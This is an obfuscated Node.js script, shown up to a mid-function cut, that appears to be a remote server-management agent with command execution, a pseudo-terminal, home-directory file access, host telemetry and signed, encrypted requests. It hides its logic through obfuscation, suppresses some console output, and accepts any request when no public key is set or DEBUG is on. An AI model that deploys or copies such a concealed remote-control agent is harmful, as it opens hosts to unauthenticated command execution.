#!/usr/bin/env node
const a0aI = a0b;
(function (a, b) {
    const aH = a0b, c = a();
    while (!![]) {
        try {
            const d = parseInt(aH(0x316)) / 0x1 * (parseInt(aH(0x1e8)) / 0x2) + -parseInt(aH(0x676)) / 0x3 + parseInt(aH(0x15b)) / 0x4 * (-parseInt(aH(0x381)) / 0x5) + parseInt(aH(0x158)) / 0x6 * (-parseInt(aH(0xd6)) / 0x7) + -parseInt(aH(0x3f5)) / 0x8 + parseInt(aH(0x378)) / 0x9 + -parseInt(aH(0x272)) / 0xa * (-parseInt(aH(0x4ca)) / 0xb);
            if (d === b)
                break;
            else
                c['push'](c['shift']());
        } catch (f) {
            c['push'](c['shift']());
        }
    }
}(a0a, 0x672ee));
const a0c = [
    'wasm\x20streaming\x20compile\x20failed',
    'Failed\x20to\x20parse\x20URL\x20from',
    a0aI(0x374)
];
function a0d(a) {
    const b = {
        'JVsdp': function (c, d) {
            return c === d;
        },
        'wAeJk': function (c) {
            return c();
        }
    };
    return function (c, d, f) {
        const aJ = a0b, g = c[aJ(0x406)]();
        if (a0c[aJ(0x204)](h => g[aJ(0x664)](h))) {
            if (b[aJ(0x13e)](typeof f, aJ(0x3f0)))
                b[aJ(0x25b)](f);
            return !![];
        }
        return a[aJ(0x6a0)](this, arguments);
    };
}
process[a0aI(0x1ac)][a0aI(0x19e)] = a0d(process[a0aI(0x1ac)][a0aI(0x19e)]), process[a0aI(0x659)][a0aI(0x19e)] = a0d(process[a0aI(0x659)][a0aI(0x19e)]);
const a0f = require('express'), a0g = require('http'), a0h = require(a0aI(0x60a)), a0i = require('net'), a0j = require(a0aI(0x328)), a0k = require('crypto'), a0l = require('fs'), a0m = require('fs')[a0aI(0x2d5)], a0n = require(a0aI(0x52a)), a0o = require('os'), {
        exec: a0p,
        spawn: a0q
    } = require(a0aI(0x655)), a0r = require(a0aI(0x132)), a0s = require('systeminformation'), {encrypt: a0t} = require(a0aI(0x57a)), a0u = require(a0aI(0x479)), a0v = require(a0aI(0x59a)), a0w = require('noise-c.wasm');
let a0x, a0y, a0z;
try {
    typeof Bun !== a0aI(0x5a5) ? a0z = require(a0aI(0x2b2)) : a0z = require('@lydell/node-pty');
} catch (a0aG) {
    console['error'](a0aI(0x47d)), console['error'](a0aI(0x501) + a0aG[a0aI(0x3f8)]), console[a0aI(0xdc)](a0aI(0x267)), process['exit'](0x1);
}
const a0A = {
    'LEVELS': {
        'DEBUG': 0x0,
        'INFO': 0x1,
        'WARN': 0x2,
        'ERROR': 0x3
    },
    get 'currentLevel'() {
        const aK = a0aI, a = {
                'WepRS': function (b, c) {
                    return b !== c;
                },
                'lntie': aK(0x5a5)
            };
        return a[aK(0x36d)](typeof a0K, a[aK(0x4e2)]) && a0K['LOG_LEVEL'] !== undefined ? a0K['LOG_LEVEL'] : 0x2;
    },
    'debug': a => {
        const aL = a0aI;
        a0A[aL(0x2e6)] <= a0A[aL(0x390)]['DEBUG'] && console['log'](aL(0x5b9) + a);
    },
    'info': a => {
        const aM = a0aI;
        a0A[aM(0x2e6)] <= a0A[aM(0x390)]['INFO'] && console[aM(0x6ce)](aM(0x2b7) + a);
    },
    'warn': a => {
        const aN = a0aI, b = {
                'WOJld': function (c, d) {
                    return c <= d;
                }
            };
        b[aN(0x5e2)](a0A[aN(0x2e6)], a0A[aN(0x390)][aN(0x3b4)]) && console[aN(0x6ce)](aN(0x409) + a);
    },
    'error': a => {
        const aO = a0aI;
        a0A[aO(0x2e6)] <= a0A[aO(0x390)][aO(0x62c)] && console[aO(0x6ce)](aO(0x55c) + a);
    }
};
class a0B {
    constructor(a = 'ok') {
        const aP = a0aI;
        this[aP(0x609)] = a;
    }
}
class a0C extends a0B {
    constructor(a = 'ok', b = 0x0) {
        const aQ = a0aI;
        super(a), this[aQ(0x5c6)] = b;
    }
}
class a0D extends a0B {
    constructor() {
        const aR = a0aI, a = { 'FrqeP': aR(0x42b) }, b = a['FrqeP'][aR(0x67f)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[aR(0x600)] = a0K[aR(0x447)];
                continue;
            case '1':
                this[aR(0x45f)] = null;
                continue;
            case '2':
                this['gpu_name'] = '';
                continue;
            case '3':
                this[aR(0x3da)] = '';
                continue;
            case '4':
                this['ipv4'] = null;
                continue;
            case '5':
                super();
                continue;
            case '6':
                this['virtualization'] = '';
                continue;
            case '7':
                this[aR(0x6b4)] = 0x0;
                continue;
            case '8':
                this['os'] = '';
                continue;
            case '9':
                this['mem_total'] = 0x0;
                continue;
            case '10':
                this['cpu_cores'] = 0x0;
                continue;
            case '11':
                this[aR(0x653)] = '';
                continue;
            case '12':
                this[aR(0x50d)] = null;
                continue;
            case '13':
                this[aR(0x437)] = '';
                continue;
            case '14':
                this[aR(0x2d1)] = 0x0;
                continue;
            case '15':
                this[aR(0x65d)] = '';
                continue;
            }
            break;
        }
    }
}
class a0E extends a0B {
    constructor() {
        const aS = a0aI, a = aS(0x1bf)[aS(0x67f)]('|');
        let b = 0x0;
        while (!![]) {
            switch (a[b++]) {
            case '0':
                this['cpu'] = { 'usage': 0x0 };
                continue;
            case '1':
                this['swap'] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '2':
                this['connections'] = {
                    'tcp': 0x0,
                    'udp': 0x0
                };
                continue;
            case '3':
                this[aS(0x542)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '4':
                this['message'] = '';
                continue;
            case '5':
                super();
                continue;
            case '6':
                this[aS(0x13d)] = {
                    'up': 0x0,
                    'down': 0x0,
                    'totalUp': 0x0,
                    'totalDown': 0x0
                };
                continue;
            case '7':
                this[aS(0x5a7)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '8':
                this[aS(0xe6)] = 0x0;
                continue;
            case '9':
                this[aS(0x2cc)] = 0x0;
                continue;
            case '10':
                this[aS(0x4f9)] = {
                    'load1': 0x0,
                    'load5': 0x0,
                    'load15': 0x0
                };
                continue;
            }
            break;
        }
    }
}
class a0F extends a0B {
    constructor() {
        const aT = a0aI;
        super(), this[aT(0x24e)] = '', this['exitcode'] = 0x0, this[aT(0x259)] = ![], this['cmd'] = '';
    }
}
class a0G {
    constructor() {
        const aU = a0aI;
        this[aU(0x21d)] = '', this[aU(0x52a)] = '', this['type'] = '', this[aU(0x18b)] = 0x0, this[aU(0x353)] = '', this[aU(0x44f)] = '', this[aU(0x538)] = '', this[aU(0x57f)] = '';
    }
}
class a0H {
    constructor() {
        const aV = a0aI, a = aV(0x38a)['split']('|');
        let b = 0x0;
        while (!![]) {
            switch (a[b++]) {
            case '0':
                this[aV(0xec)] = '';
                continue;
            case '1':
                this['writable'] = ![];
                continue;
            case '2':
                this['path'] = '';
                continue;
            case '3':
                this[aV(0x516)] = ![];
                continue;
            case '4':
                this[aV(0x44f)] = '';
                continue;
            case '5':
                this[aV(0x21d)] = '';
                continue;
            case '6':
                this[aV(0x538)] = '';
                continue;
            case '7':
                this['readable'] = ![];
                continue;
            }
            break;
        }
    }
}
class a0I extends a0B {
    constructor() {
        const aW = a0aI;
        super(), this[aW(0x544)] = [];
    }
}
class a0J {
    static ['_generateRawKeypair']() {
        const aX = a0aI, a = {
                'PgnLY': aX(0x51e),
                'IfqXR': aX(0x2d2),
                'xySYP': function (i, j) {
                    return i !== j;
                },
                'gVICe': aX(0x68a)
            }, {
                privateKey: b,
                publicKey: c
            } = a0k[aX(0x223)](aX(0x661)), d = b[aX(0x154)]({ 'format': a[aX(0x56c)] }), f = c[aX(0x154)]({ 'format': aX(0x51e) }), g = Buffer[aX(0x613)](d['d'], 'base64url'), h = Buffer['from'](f['x'], a[aX(0x466)]);
        return (a['xySYP'](g['length'], 0x20) || h[aX(0x3d0)] !== 0x20) && a0A['error'](aX(0x27b)), {
            'private_b64': g[aX(0x406)](a['gVICe']),
            'public_b64': h['toString'](a[aX(0x350)])
        };
    }
    static [a0aI(0x19a)](a) {
        const aY = a0aI, b = this[aY(0x2d9)]();
        return {
            'role': a,
            'private_b64': b[aY(0x37f)],
            'public_b64': b[aY(0x117)]
        };
    }
    static ['generatePair'](a = a0aI(0x5cb), b = a0aI(0x576)) {
        const aZ = a0aI, c = {
                'control': this[aZ(0x19a)](a),
                'agent': this[aZ(0x19a)](b)
            };
        return c;
    }
}
class a0K {
    static [a0aI(0x4d2)] = parseInt(process.env.EXEC_TIMEOUT || '30');
    static [a0aI(0x563)] = (process.env.EXEC_SHELL || a0aI(0x255))[a0aI(0x43b)]() === a0aI(0x255);
    static [a0aI(0x1b3)] = (process.env.DEBUG || a0aI(0x2c6))[a0aI(0x43b)]() === a0aI(0x255);
    static ['TIMESTAMP_WINDOW'] = parseInt(process.env.TIMESTAMP_WINDOW || a0aI(0xee));
    static [a0aI(0x44b)] = parseInt(process.env.LOG_LEVEL || (this[a0aI(0x1b3)] ? '0' : '2'), 0xa);
    static [a0aI(0x5fb)] = a0K['_getConfigValue'](a0aI(0x2a0), a0aI(0x3ed)) || 'ECDSA公钥内容';
    static ['ECIES_PUBLIC_KEY_PEM'] = a0K[a0aI(0x694)](a0aI(0x205), a0aI(0x3f1)) || 'ECIES公钥内容';
    static [a0aI(0x35c)] = parseInt(process.env.TEMPKEY_TTL || '24', 0xa);
    static [a0aI(0x263)] = parseInt(process.env.TEMPKEY_MAX_TTL || a0aI(0x474), 0xa);
    static [a0aI(0xf4)] = process.env.FILE_ROOT || a0o['homedir']();
    static [a0aI(0x213)] = parseInt(process.env.MAX_UPLOAD_SIZE || a0aI(0x39b));
    static [a0aI(0x122)] = (process.env.FOLLOW_SYMLINKS || 'false')[a0aI(0x43b)]() === a0aI(0x255);
    static [a0aI(0x118)] = (process.env.FILE_AUDIT_LOG || a0aI(0x255))[a0aI(0x43b)]() === 'true';
    static [a0aI(0x424)] = !![];
    static [a0aI(0x42f)] = [];
    static [a0aI(0x449)] = {};
    static ['cronloop'] = ![];
    static [a0aI(0x276)] = parseInt(process.env.TASK_TIMEOUT || a0aI(0x161));
    static [a0aI(0x2be)] = parseInt(process.env.CRON_INTERVAL || '30');
    static ['onetimetasks_log'] = [];
    static ['crontasks_log'] = [];
    static [a0aI(0x3fa)] = parseInt(process.env.MAX_TASK_LOG || a0aI(0x40b));
    static [a0aI(0x113)] = process.env.HOST || a0aI(0x529);
    static [a0aI(0x1ef)] = parseInt(process.env.KPORT || process.env.PORT || process.env.SERVER_PORT || a0aI(0x171));
    static [a0aI(0x447)] = process.env.AGENT_VERSION || a0aI(0x177);
    static [a0aI(0x31b)] = a0k[a0aI(0x3d5)](0x20)[a0aI(0x406)](a0aI(0x68a));
    static ['NOISE_KEYS_INTERNAL'] = a0J[a0aI(0x4ed)]();
    static [a0aI(0x331)] = {
        'controller': { 'private': this[a0aI(0x2d8)]['control'][a0aI(0x37f)] },
        'agent': { 'public': this[a0aI(0x2d8)][a0aI(0x3ca)][a0aI(0x117)] }
    };
    static [a0aI(0x16f)] = 0xe10;
    static [a0aI(0x103)] = 0x1e;
    static [a0aI(0x60e)] = null;
    static [a0aI(0x15f)] = 0x0;
    static [a0aI(0x618)] = null;
    static [a0aI(0x2f8)] = null;
    static [a0aI(0x24f)] = 0x0;
    static [a0aI(0x403)] = null;
    static [a0aI(0x694)](a, b) {
        const b0 = a0aI, c = { 'XZKMM': b0(0xd9) }, d = process.env[a];
        if (d)
            return d;
        const f = a0n['join'](__dirname, b);
        if (a0l[b0(0x41a)](f))
            try {
                return a0l[b0(0x2c1)](f, c['XZKMM'])[b0(0x162)]();
            } catch (g) {
            }
        return '';
    }
    static [a0aI(0x6ab)]() {
        const b1 = a0aI, a = {
                'ZbLVI': b1(0x689),
                'tZePc': function (b, c) {
                    return b > c;
                },
                'dzBwF': b1(0x17c),
                'vfMpd': b1(0x198),
                'ioUyd': b1(0x5aa),
                'jwwrQ': '\x20\x20\x201.\x20设置环境变量:\x20export\x20ECDSA_PUBKEY=\x27-----BEGIN\x20PUBLIC\x20KEY-----\x27...\x27'
            };
        if (!this[b1(0x1b3)]) {
            const b = [];
            !this['ECDSA_PUBLIC_KEY_PEM'] && b['push']('ECDSA_PUBKEY:\x20未设置环境变量且文件\x20keys/agent_ecdsa_pub.pem\x20不存在');
            !this[b1(0x6cd)] && b['push'](a[b1(0x389)]);
            if (a[b1(0x44c)](b['length'], 0x0)) {
                const c = a[b1(0x511)][b1(0x67f)]('|');
                let d = 0x0;
                while (!![]) {
                    switch (c[d++]) {
                    case '0':
                        a0A[b1(0x48b)](b1(0x56e));
                        continue;
                    case '1':
                        a0A[b1(0x48b)](a[b1(0x602)]);
                        continue;
                    case '2':
                        process['exit'](0x1);
                        continue;
                    case '3':
                        b[b1(0x56a)](f => a0A[b1(0xdc)](b1(0x4fb) + f));
                        continue;
                    case '4':
                        a0A[b1(0xdc)](a[b1(0x579)]);
                        continue;
                    case '5':
                        a0A[b1(0x48b)](a[b1(0x115)]);
                        continue;
                    }
                    break;
                }
            }
        }
    }
    static [a0aI(0x36b)](a = {}) {
        const b2 = a0aI, b = {
                'ZlslD': function (c, d) {
                    return c !== d;
                },
                'mBfCO': function (c, d, f) {
                    return c(d, f);
                },
                'OgtDx': function (c, d) {
                    return c(d);
                }
            };
        if (!a)
            return;
        b[b2(0x38e)](a[b2(0x1ef)], undefined) && a[b2(0x1ef)] !== null && (this['PORT'] = b[b2(0x504)](parseInt, b[b2(0x6d8)](String, a[b2(0x1ef)]), 0xa)), a['ECDSA_PUBLIC_KEY_PEM'] && (this['ECDSA_PUBLIC_KEY_PEM'] = a[b2(0x5fb)][b2(0x162)]()), a[b2(0x6cd)] && (this[b2(0x6cd)] = a['ECIES_PUBLIC_KEY_PEM'][b2(0x162)]());
    }
}
class a0L {
    constructor() {
        const b3 = a0aI;
        this[b3(0x552)] = null;
    }
    [a0aI(0x127)](a) {
        const b4 = a0aI;
        if (this[b4(0x552)] && !this[b4(0x54a)](this[b4(0x552)]))
            return this[b4(0x552)];
        return this[b4(0x552)] = this[b4(0x460)](a), a0A[b4(0x6be)](b4(0x210) + this[b4(0x552)][b4(0x4d1)] + b4(0x38d) + a + b4(0x5de)), this[b4(0x552)];
    }
    [a0aI(0x5c2)]() {
        const b5 = a0aI;
        if (this[b5(0x552)] && !this[b5(0x54a)](this[b5(0x552)]))
            return this[b5(0x552)][b5(0x673)];
        return null;
    }
    [a0aI(0x2e7)]() {
        const b6 = a0aI;
        if (this[b6(0x552)] && !this[b6(0x54a)](this[b6(0x552)]))
            return this[b6(0x552)][b6(0x31f)];
        return null;
    }
    [a0aI(0x54a)](a) {
        const b7 = a0aI, b = {
                'vnyKw': function (c, d) {
                    return c >= d;
                },
                'LcEUZ': function (c, d) {
                    return c / d;
                }
            };
        return b['vnyKw'](Math[b7(0x1bb)](b[b7(0x27c)](Date['now'](), 0x3e8)), a[b7(0x39e)]);
    }
    [a0aI(0x460)](a) {
        const b8 = a0aI, b = {
                'BnNpJ': 'prime256v1',
                'gLTvR': b8(0x202),
                'lsRca': b8(0x414),
                'umKBQ': 'spki',
                'wzDRO': function (l, m) {
                    return l / m;
                },
                'ctKwi': function (l, m) {
                    return l * m;
                },
                'cpmKp': 'hex',
                'tcxUI': function (l, m) {
                    return l + m;
                }
            }, {
                privateKey: c,
                publicKey: d
            } = a0k[b8(0x223)]('ec', { 'namedCurve': b[b8(0x4f0)] }), f = c[b8(0x154)]({
                'type': b[b8(0x459)],
                'format': b[b8(0x249)]
            }), g = d[b8(0x154)]({
                'type': b[b8(0x2bf)],
                'format': b[b8(0x249)]
            }), h = a0k[b8(0x3d5)](0x20), i = Buffer[b8(0x613)](a0y[b8(0x5ea)](h, ![])), j = Math[b8(0x1bb)](b[b8(0xe7)](Date[b8(0x543)](), 0x3e8)), k = b[b8(0x557)](a, 0xe10);
        return {
            'key_id': a0k['randomBytes'](0x8)['toString'](b[b8(0x388)]),
            'created_at': j,
            'expires_at': b[b8(0xed)](j, k),
            'ttl_seconds': k,
            'ecdsa_private_key': f,
            'ecdsa_public_key': g,
            'ecies_private_key': h[b8(0x406)](b[b8(0x388)]),
            'ecies_public_key': i[b8(0x406)](b[b8(0x388)]),
            'ecdsa_vk': d,
            'ecies_pub': i
        };
    }
}
class a0M {
    constructor(a, b) {
        const b9 = a0aI, c = {
                'vhevV': b9(0x322),
                'IdBbM': b9(0x68a),
                'wbzgX': function (d, f) {
                    return d(f);
                },
                'oPVOR': function (d, f) {
                    return d(f);
                },
                'FLpHA': b9(0x3e5)
            };
        this[b9(0x423)] = null, this[b9(0x426)] = null;
        if (a)
            try {
                const d = a['trim']();
                if (d[b9(0x1bd)](c[b9(0x4f5)]))
                    this[b9(0x423)] = a0k[b9(0x4b7)](d);
                else {
                    const f = Buffer['from'](d, c['IdBbM']), g = a0x[b9(0x484)]['fromBytes'](f), h = g[b9(0xe2)](![]), i = m => m[b9(0x406)](b9(0x68a))[b9(0x4e4)](/\+/g, '-')[b9(0x4e4)](/\//g, '_')[b9(0x4e4)](/=/g, ''), j = c[b9(0x458)](i, Buffer[b9(0x613)](h['slice'](0x1, 0x21))), k = c[b9(0x62d)](i, Buffer[b9(0x613)](h[b9(0x10d)](0x21, 0x41))), l = {
                            'kty': 'EC',
                            'crv': c[b9(0x59d)],
                            'x': j,
                            'y': k
                        };
                    this[b9(0x423)] = a0k['createPublicKey']({
                        'key': l,
                        'format': b9(0x51e)
                    });
                }
            } catch (m) {
                a0A[b9(0xdc)](b9(0x5f4) + m[b9(0x3f8)]), this[b9(0x423)] = null;
            }
        if (b)
            try {
                this['eciesPubkey'] = a0u[b9(0x528)](b[b9(0x162)]());
            } catch (n) {
                a0A[b9(0xd5)](b9(0x3ba) + n[b9(0x3f8)]);
            }
    }
    [a0aI(0x48e)](a, b, c, d = null) {
        const ba = a0aI, f = {
                'bGgcP': function (g, h) {
                    return g(h);
                },
                'viogB': function (g, h) {
                    return g / h;
                },
                'cLsll': function (g, h) {
                    return g > h;
                },
                'EIobP': function (g, h) {
                    return g - h;
                },
                'bQQRJ': 'temp',
                'ZpaAS': 'Bad\x20signature'
            };
        if (!this['ecdsaPubkey'])
            return !![];
        try {
            const g = f[ba(0x2cd)](parseInt, b), h = Math['floor'](f[ba(0x1f0)](Date['now'](), 0x3e8));
            if (f['cLsll'](Math['abs'](h - g), a0K[ba(0x1a9)]))
                throw new Error('Timestamp\x20expired:\x20diff=' + Math['abs'](f['EIobP'](h, g)) + ba(0x182) + a0K[ba(0x1a9)] + 's');
            const i = '' + a + b;
            if (this[ba(0x1d0)](this[ba(0x423)], i, c))
                return ba(0x199);
            if (d && this[ba(0x1d0)](d, i, c))
                return f[ba(0x408)];
            throw new Error(f[ba(0x5c1)]);
        } catch (j) {
            throw new Error(ba(0x662) + j['message']);
        }
    }
    [a0aI(0x1d0)](a, b, c) {
        const bb = a0aI, d = { 'jBmwg': 'SHA256' };
        if (!a)
            return ![];
        try {
            const f = a0u[bb(0x528)](c), g = a0k['createVerify'](d['jBmwg']);
            return g[bb(0x54e)](b), g[bb(0x16e)](a, f);
        } catch (h) {
            return ![];
        }
    }
    [a0aI(0x455)](a, b = null) {
        const bc = a0aI, c = {
                'Kmxtb': bc(0x3f3),
                'bLztH': function (d, f, g) {
                    return d(f, g);
                },
                'reAav': bc(0x68a)
            };
        if (a0K[bc(0x1b3)] || !this[bc(0x426)])
            return JSON['stringify'](a);
        try {
            const d = JSON[bc(0x1f1)](a), f = Buffer[bc(0x613)](d, c[bc(0x19c)]), g = b || Buffer[bc(0x613)](this['eciesPubkey']), h = c[bc(0xde)](a0t, g, f);
            return Buffer['from'](h)[bc(0x406)](c[bc(0x3bc)]);
        } catch (i) {
            const j = {
                '_encrypt_error': i['message'],
                '_raw': a0K[bc(0x1b3)] ? a : null
            };
            return JSON[bc(0x1f1)](j);
        }
    }
    [a0aI(0x1ed)](a, b) {
        const bd = a0aI, c = {
                'srvWT': function (d, f) {
                    return d !== f;
                },
                'jwKPM': bd(0x68a),
                'QhGvU': bd(0xd9),
                'XnUoD': bd(0x435)
            };
        if (!b || c[bd(0x18f)](b[bd(0x3d0)], 0x20))
            throw new Error(bd(0x123));
        try {
            const d = Buffer[bd(0x613)](a, c[bd(0x1f2)])[bd(0x406)](c['QhGvU']), f = JSON[bd(0x65e)](d);
            if (!f[bd(0x46d)] || !f[bd(0x326)] || !f[bd(0x395)])
                throw new Error(bd(0x464));
            const g = Buffer[bd(0x613)](f[bd(0x46d)], c['jwKPM']), h = Buffer['from'](f[bd(0x326)], 'base64'), i = Buffer[bd(0x613)](f[bd(0x395)], c[bd(0x1f2)]), j = a0k[bd(0x145)](c[bd(0x2e0)], b, g);
            j[bd(0x5a2)](h);
            let k = j[bd(0x54e)](i, null, bd(0xd9));
            return k += j[bd(0x306)](c[bd(0x672)]), k;
        } catch (l) {
            throw new Error(bd(0x4d0) + l['message']);
        }
    }
}
function a0N(a, b = null) {
    const be = a0aI, c = {
            'fKfKZ': be(0x5f9),
            'gmTXJ': be(0x338),
            'GsFZv': function (d, f) {
                return d === f;
            },
            'AgabH': be(0x450),
            'jOYOq': function (d, f) {
                return d === f;
            },
            'QAOrQ': be(0x4f3),
            'pucWr': be(0x2c8),
            'jtEhd': 'true',
            'gxsRC': be(0x14e),
            'ArkSS': be(0x55d),
            'XfoQs': be(0xd9),
            'DPuCT': function (d, f) {
                return d === f;
            },
            'NEAaQ': be(0x2c6),
            'iKTFf': function (d) {
                return d();
            },
            'QugKb': be(0x25c),
            'ZmJYX': 'HEAD',
            'BRAQa': function (d) {
                return d();
            },
            'rfAhw': be(0x6a4),
            'LeHvo': be(0x1ec),
            'dRImx': function (d) {
                return d();
            },
            'zcNTJ': be(0x3c5),
            'uSJCn': 'X-Nonce',
            'PlULK': be(0x1ca),
            'zMuti': be(0x136),
            'mQMgk': be(0x3f6),
            'goPzO': be(0x4ea),
            'BLJIN': function (d, f) {
                return d || f;
            },
            'gNoVt': function (d) {
                return d();
            },
            'NAVOr': function (d, f) {
                return d === f;
            },
            'RHpfl': be(0x37e),
            'meAiV': be(0x68a),
            'frbEs': be(0x36c),
            'oEWEY': be(0x3f3),
            'FIHuI': function (d) {
                return d();
            }
        };
    return async (d, f, g) => {
        const bf = be;
        if (d['path'][bf(0x1bd)](bf(0x10c)) || (d[bf(0x4b5)][bf(0x29e)] || '')['toLowerCase']() === 'websocket')
            return c[bf(0x372)](g);
        if (c[bf(0x3e7)](d[bf(0x193)], c[bf(0x11e)]) || c[bf(0x6c0)](d['method'], c['ZmJYX']))
            return c[bf(0x3ab)](g);
        d[bf(0x173)] = ![];
        const h = [
            c['rfAhw'],
            c['LeHvo']
        ];
        if (a0K[bf(0x1b3)])
            return d[bf(0x173)] = !![], c[bf(0x12c)](g);
        const i = d['headers'][c[bf(0x197)]] || d[bf(0x4b5)][c['uSJCn']], j = d[bf(0x4b5)][c[bf(0x206)]] || d['headers'][c[bf(0x167)]], k = d[bf(0x4b5)][c[bf(0x147)]] || d['headers'][c[bf(0x3cd)]];
        if (c[bf(0x2e4)](!i, !j) || !k)
            return h[bf(0x664)](d['path']) ? c[bf(0x12c)](g) : f[bf(0x609)](0x191)['json']({ 'error': bf(0x491) });
        try {
            const m = b ? b[bf(0x5c2)]() : null, n = a['verifySignature'](i, j, k, m);
            d[bf(0x173)] = !![], d[bf(0x1ab)] = n === bf(0x4f3) ? c['QAOrQ'] : 'static';
        } catch (o) {
            return h['includes'](d[bf(0x52a)]) ? c['gNoVt'](g) : f[bf(0x609)](0x191)['json']({ 'error': bf(0x662) + o['message'] });
        }
        if (d[bf(0x42a)] && c['NAVOr'](typeof d[bf(0x42a)], c[bf(0x69c)])) {
            const p = (d[bf(0x4b5)][c['RHpfl']] || '')[bf(0x43b)]() === c['jtEhd'];
            try {
                if (p && d[bf(0x173)]) {
                    const q = Buffer['from'](a0K[bf(0x31b)], c[bf(0x2ae)]), r = a[bf(0x1ed)](d[bf(0x42a)], q);
                    d[bf(0x42a)] = JSON[bf(0x65e)](r);
                } else {
                    if (d[bf(0x42a)][bf(0x1bd)](c['frbEs'])) {
                        const s = Buffer[bf(0x613)](d[bf(0x42a)], c['meAiV'])['toString'](c[bf(0x1e6)]);
                        d[bf(0x42a)] = JSON[bf(0x65e)](s);
                    } else {
                        if (d[bf(0x42a)][bf(0x162)]()[bf(0x1bd)]('{') || d[bf(0x42a)][bf(0x162)]()[bf(0x1bd)]('['))
                            d['body'] = JSON[bf(0x65e)](d[bf(0x42a)]);
                        else {
                            if (c[bf(0x6ae)](d[bf(0x42a)]['trim'](), ''))
                                d[bf(0x42a)] = {};
                        }
                    }
                }
            } catch (t) {
                return a0A[bf(0xdc)](bf(0x5f3) + t[bf(0x3f8)]), f[bf(0x609)](0x190)[bf(0x170)]({ 'error': 'Invalid\x20body\x20format:\x20' + t['message'] });
            }
        }
        const l = f['send'];
        f[bf(0x1d1)] = function (u) {
            const bg = bf;
            if (f[bg(0x327)](c[bg(0x475)]) && f[bg(0x327)](c[bg(0x475)])[bg(0x664)](c[bg(0x2fe)]))
                try {
                    const v = c['GsFZv'](typeof u, c['AgabH']) ? JSON[bg(0x65e)](u) : u;
                    if (d[bg(0x173)]) {
                        let w = null;
                        c[bg(0x6ae)](d[bg(0x1ab)], c[bg(0x401)]) && b && (w = b[bg(0x2e7)]());
                        const x = a[bg(0x455)](v, w), y = typeof x === c[bg(0x69c)] ? x : JSON[bg(0x1f1)](x);
                        return f[bg(0x521)](c[bg(0x126)], c['jtEhd']), f[bg(0x521)](c['gxsRC'], a0K[bg(0x447)]), f[bg(0x521)](c[bg(0x208)], Buffer[bg(0x234)](y, c[bg(0x1d9)])['toString']()), l[bg(0x1b5)](this, y);
                    } else {
                        const z = c[bg(0x3e7)](typeof u, c['AgabH']) ? u : JSON[bg(0x1f1)](v);
                        return f[bg(0x521)](c[bg(0x126)], c[bg(0x28e)]), f[bg(0x521)](c[bg(0x208)], Buffer[bg(0x234)](z, c[bg(0x1d9)])['toString']()), l[bg(0x1b5)](this, z);
                    }
                } catch (A) {
                    if (a0K['DEBUG'])
                        a0A[bg(0xdc)](bg(0x570) + A[bg(0x3f8)]);
                }
            return l[bg(0x1b5)](this, u);
        }, c[bf(0x26d)](g);
    };
}
class a0O {
    constructor() {
        const bh = a0aI, a = {
                'OZMqI': function (b, c) {
                    return b / c;
                }
            };
        this[bh(0x1d7)] = {
            'rx': 0x0,
            'tx': 0x0
        }, this['totalNetworkUp'] = 0x0, this['totalNetworkDown'] = 0x0, this[bh(0x49d)] = a[bh(0x6a5)](Date[bh(0x543)](), 0x3e8);
    }
    async ['getContainerMemory']() {
        const bi = a0aI, a = {
                'ensbe': bi(0x22c),
                'lQFrS': 'utf8',
                'XaJxQ': function (d, f) {
                    return d === f;
                },
                'hDhju': bi(0x183),
                'QWoht': function (d, f, g) {
                    return d(f, g);
                },
                'DUVwP': function (d, f, g) {
                    return d(f, g);
                },
                'GZSpc': '/sys/fs/cgroup/memory.current',
                'IibdM': '/sys/fs/cgroup/memory/memory.limit_in_bytes',
                'HrWal': bi(0x292),
                'VHqmS': function (d, f) {
                    return d === f;
                },
                'jaZjm': function (d, f) {
                    return d === f;
                },
                'XXxUj': function (d, f) {
                    return d(f);
                },
                'SzXMl': function (d, f) {
                    return d - f;
                }
            };
        let b = null, c = null;
        try {
            const d = (await a0m[bi(0x5f5)](a[bi(0x35a)], a['lQFrS']))['trim']();
            b = a[bi(0x274)](d, a[bi(0x24c)]) ? null : a['QWoht'](parseInt, d, 0xa), c = a[bi(0x33e)](parseInt, (await a0m[bi(0x5f5)](a[bi(0x6b7)], a['lQFrS']))[bi(0x162)](), 0xa);
        } catch {
            try {
                b = parseInt((await a0m['readFile'](a[bi(0x1df)], a['lQFrS']))[bi(0x162)](), 0xa), c = a[bi(0x33e)](parseInt, (await a0m[bi(0x5f5)](a[bi(0x5b7)], a[bi(0x665)]))[bi(0x162)](), 0xa);
                if (b > 0x7ffffffffffff000)
                    b = null;
            } catch {
                const f = await a0s['mem']();
                b = f[bi(0xc7)], c = f['used'];
            }
        }
        if (a[bi(0x3a5)](b, null)) {
            const g = await a0s[bi(0x6c9)]();
            b = g[bi(0xc7)], (a[bi(0x404)](c, null) || a[bi(0x405)](isNaN, c)) && (c = g['used']);
        }
        return {
            'total': b,
            'used': c,
            'available': b - c,
            'free': a[bi(0x4d6)](b, c),
            'cached': 0x0,
            'buffers': 0x0
        };
    }
    async [a0aI(0xf1)]() {
        const bj = a0aI, [a, b, c, d] = await Promise[bj(0x2ef)]([
                a0s['cpu'](),
                this['getContainerMemory'](),
                a0s[bj(0x4c0)](),
                a0s['networkInterfaces']()
            ]);
        let f = null, g = null;
        try {
            [f, g] = await Promise['all']([
                this[bj(0x142)](),
                this[bj(0x2f3)]()
            ]);
        } catch (h) {
            a0A['debug'](bj(0xf2) + h[bj(0x3f8)], 0x1);
        }
        return {
            'arch': a0o['arch'](),
            'cpu_cores': a[bj(0x1e5)],
            'cpu_name': a[bj(0x14f)],
            'disk_total': (await a0s[bj(0x339)]())[0x0]?.[bj(0x18b)] || 0x0,
            'gpu_name': '',
            'ipv4': f,
            'ipv6': g,
            'mem_total': b[bj(0xc7)],
            'os': c[bj(0x678)] + '\x20' + c['release'],
            'kernel_version': c[bj(0x461)],
            'swap_total': b['swaptotal'],
            'version': a0K[bj(0x447)],
            'virtualization': await this[bj(0x4da)](),
            'session_key': a0K['SESSION_KEY'],
            'noise_key': a0K['NOISE_KEY']
        };
    }
    [a0aI(0x5cd)]() {
        const bk = a0aI, a = {
                'qKhUB': function (c, d) {
                    return c === d;
                }
            }, b = a0o[bk(0x174)]();
        for (const c of Object[bk(0x6d0)](b)) {
            for (const d of b[c]) {
